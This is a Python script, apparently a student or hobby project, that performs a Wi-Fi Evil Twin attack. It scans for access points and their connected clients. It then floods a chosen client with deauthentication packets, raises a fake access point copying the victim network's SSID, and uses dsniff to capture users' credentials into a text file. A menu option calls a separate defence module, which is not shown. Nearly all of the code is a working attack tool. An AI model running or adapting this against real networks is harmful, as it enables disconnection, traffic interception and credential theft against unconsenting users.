from scapy.all import *
from threading import *
import os
import time

import fakeAP as fake_ap
import defense as defense

# Preparing the card for monitor mode
def switchToMonitorMode(sniff_network_adapter):
    os.system('sudo ifconfig %s down' % sniff_network_adapter)
    os.system('sudo iwconfig %s mode monitor' % sniff_network_adapter)
    os.system('sudo ifconfig %s up' % sniff_network_adapter)


# ----- Scanning the area, searching for wifi access ------------

AP_List = []

def AP_Scaning(sniff_network_adapter):
    
    print("Scanning for Access Points with %s..." % sniff_network_adapter)
    # Scan for 30 seconds
    sniff(iface = sniff_network_adapter, prn = PacketHandlerAP, timeout = 30)

    rescan = input("\nDo you want to rescan? [y/n]: ")
    if(rescan == "y"):
        AP_Scaning(sniff_network_adapter)

# ------------------------------------------------------------------

# Sniff packets of AP
countAP = 0
def PacketHandlerAP(packet):
    global countAP
    # if packet has 802.11 layer (Beacoin) and filter type & subtype of packets
    if packet.haslayer(Dot11):
        if (packet.type == 0 and packet.subtype == 8):
            if [packet.addr2, packet.info, int(ord(packet[Dot11Elt:3].info))] not in AP_List:
                #AP, SSID, Channel
                AP_List.append([packet.addr2, packet.info,
                               int(ord(packet[Dot11Elt:3].info))])
                print("Index: %s | Access Point MAC: %s | with SSID: %s  | Channel: %d" %(countAP,packet.addr2,packet.info, int(ord(packet[Dot11Elt:3].info))))
                countAP = countAP + 1

# -------- Selecting which access point(WLAN) we want to attack --------------

def attackAP(sniff_network_adapter, fakeAP_network_adapter):
    result = input("Choose number of AP to attack: ")

    ssid = str(AP_List[int(result)][1])
    ssid = ssid[2:len(ssid)-1]
    Channel_victim = int(AP_List[int(result)][2])

    print("Selected access point: " + ssid)

    #For FakeAP configuration files
    fake_ap.Create_hostapd(fakeAP_network_adapter, ssid, Channel_victim)
    fake_ap.Create_dnsmasq(fakeAP_network_adapter)

    # Change your network card to the same channel of AP victim
    os.system('iwconfig %s channel %d' % (sniff_network_adapter, Channel_victim))

    # Client scanning from chosen AP
    MAC_victim = AP_List[int(result)][0]
    clientScaning(MAC_victim, sniff_network_adapter)

# ------------------------------------------------------------------

clientList = []
target_mac = ""

def clientScaning(MAC_victim, sniff_network_adapter):
    print("Scanning for clients of AP: %s..." %MAC_victim)
    global target_mac
    target_mac = MAC_victim
    sniff(iface = sniff_network_adapter, prn = PacketHandlerClients, timeout=30)

# ------------------------------------------------------------------

# Sniff packets of client
counter_clients = 0
def PacketHandlerClients(packet):
    global clientList
    global counter_clients
    #
    if ((packet.addr2 == target_mac or packet.addr3 == target_mac) and packet.addr1 != "ff:ff:ff:ff:ff:ff"):
        #
        if packet.addr1 not in clientList:
            #
            if packet.addr2 != packet.addr1 and packet.addr1 != packet.addr3:
                clientList.append(packet.addr1)
                print("Index: %s | MAC Client: %s" %(counter_clients,packet.addr1))
                counter_clients += 1


# -------------Selecting a victim (client) and performing an Evil-Twin attack ---------------

# Disconnects the target client from the network
def attackClient(sniff_network_adapter, fakeAP_network_adapter):
    while len(clientList) == 0:
        print("No clients found, searching again...")
        clientScaning(target_mac, sniff_network_adapter)

    rescan = input("Do you want to rescan? [y/n]: ")
    if(rescan == "y"):
        clientScaning(target_mac, sniff_network_adapter)

    choice = input("Choose index of client to attack: ")

    disconnectThread = threading.Thread(
        target=DisconnectAttack, args=(choice, sniff_network_adapter))
    disconnectThread.daemon = True
    disconnectThread.start()

    time.sleep(5)

# ------------------------------------------------------------------

def DisconnectAttack(choice, sniff_network_adapter):
        # send the packet
        for y in range(1000):
            dot11 = Dot11(addr1 = clientList[int(choice)], addr2=target_mac, addr3=target_mac)
            packet = RadioTap()/dot11/Dot11Deauth()
            sendp(packet, iface=sniff_network_adapter, count=30, inter = .001)

        print('---> Finishing sending prob requests to AP...\n')

# ----------------------------- Setup Fake AP ------------------------------

def setupAP(fakeAP_network_adapter):
    print('---> Raising up Fake AP spot\n')
    fake_ap.init_setting()
    fake_ap.start(fakeAP_network_adapter)

# ------------------------------------------------------------------

def save_info_users():
    os.system("sudo dsniff -p /home/capture/captureAP >> info_users.txt")

# ------------------------------------------------------------------

def reset_network(iface):
    os.system("sudo airmon-ng stop "+ iface)
    os.system("sudo systemctl start NetworkManager")
    os.system("clear")

# =================================================================================

if __name__ == "__main__":
    os.system("iwconfig")  # show the list of wlan
    sniff_network_adapter = input("Enter your network adapter for sniff packets: ")
    fakeAP_network_adapter = input("Enter your network adapter for setup fake AP: ")
    
    switchToMonitorMode(sniff_network_adapter)
    
    print("\n~~~~~~~~~~~~~~ Welcome ~~~~~~~~~~~~~~\n")
    print("1.Evil Twin Attack\n")
    print("2.Evil Twin Active Defence\n")
    choise = input("Choose option: ")
    if int(choise) == 1:
        #Stages of Evil-Twin attack
        AP_Scaning(sniff_network_adapter)
        attackAP(sniff_network_adapter, fakeAP_network_adapter)
        attackClient(sniff_network_adapter, fakeAP_network_adapter)

        setupAP(fakeAP_network_adapter)
        finish = input('--------Press Enter to stop FakeAP--------\n')
        save_info_users()
    
    elif int(choise) == 2:
        defense.activateDefenseMode(sniff_network_adapter)
    else:
        choise = input("Choose option: ")
        
    
    reset_network(sniff_network_adapter)
    fake_ap.Delete_conf_files()

